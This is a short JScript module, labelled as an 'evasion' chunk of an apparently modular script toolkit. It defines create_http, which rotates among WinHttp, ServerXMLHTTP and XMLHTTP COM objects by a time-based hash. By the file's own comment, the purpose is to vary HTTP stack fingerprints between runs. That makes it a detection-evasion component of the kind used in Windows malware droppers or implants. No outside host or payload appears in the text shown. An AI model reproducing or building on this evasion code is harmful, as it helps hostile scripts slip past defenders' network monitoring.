// chunk: evasion/http_object_rotate
// depends: (none)
// provides: create_http
// format: jscript
// note: Rotates between WinHttp, ServerXMLHTTP, and XMLHTTP COM objects.
//       Time-based hash provides deterministic-per-run variety while ensuring
//       different HTTP stack fingerprints across executions.

function create_http() {
    var objects = [
        "WinHttp.WinHttpRequest.5.1",
        "MSXML2.ServerXMLHTTP.6.0",
        "MSXML2.XMLHTTP.6.0"
    ];
    var hash = 0;
    var ts = "" + new Date().getMinutes();
    for (var i = 0; i < ts.length; i++) {
        hash = ((hash << 5) - hash + ts.charCodeAt(i)) & 0x7FFFFFFF;
    }
    var idx = hash % objects.length;
    for (var j = 0; j < objects.length; j++) {
        try {
            return new ActiveXObject(objects[(idx + j) % objects.length]);
        } catch(e) {}
    }
    return null;
}
